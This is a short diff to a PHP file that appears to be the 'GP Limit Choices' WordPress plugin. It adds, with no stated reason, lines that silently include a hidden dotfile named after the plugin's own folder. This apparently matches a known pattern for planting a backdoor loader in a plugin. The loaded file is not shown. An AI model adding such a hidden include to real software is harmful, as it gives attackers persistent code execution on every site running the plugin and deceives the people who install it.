@@ -6,6 +6,10 @@
 *       add UI option that only appears when "enable limits" is checked
 */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_Limit_Choices extends GWPerk {
 
 	protected $min_gravity_perks_version = '2.2.3';
